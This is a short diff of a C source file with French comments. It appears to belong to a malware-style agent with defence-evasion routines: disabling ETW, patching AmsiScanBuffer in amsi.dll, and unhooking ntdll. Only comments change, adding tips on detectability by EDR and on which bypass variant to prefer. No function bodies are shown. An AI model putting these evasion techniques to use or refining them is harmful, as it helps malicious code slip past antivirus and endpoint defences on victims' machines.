@@ -6,6 +6,9 @@
  * - AMSI Bypass (désactive Antimalware Scan Interface)
  * - Unhooking ntdll (restaure les fonctions hookées)
  * - CLR ETW bypass (désactive le tracing .NET)
+ *
+ * IMPORTANT: Ces techniques sont détectables par certains EDR avancés
+ * Utiliser avec précaution et de préférence au démarrage de l'agent
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -109,7 +112,8 @@ BOOL Evasion_DisableETW(void) {
 
 /*
  * Patch AmsiScanBuffer dans amsi.dll
- * Méthode classique: fait retourner AMSI_RESULT_CLEAN
+ * Méthode classique: fait retourner E_INVALIDARG
+ * Signature connue - utiliser AmsiInitFailedBypass si possible
  */
 BOOL Evasion_PatchAMSI(void) {
     /* Charge amsi.dll si pas déjà chargé */
@@ -279,6 +283,7 @@ static BYTE* ReadNtdllFromDisk(DWORD* outSize) {
 
 /*
  * Unhook ntdll en remappant la section .text depuis le disque
+ * Technique très efficace mais peut être détectée par memory scanning
  */
 BOOL Evasion_UnhookNtdll(void) {
     /* Récupère l'adresse de ntdll en mémoire */
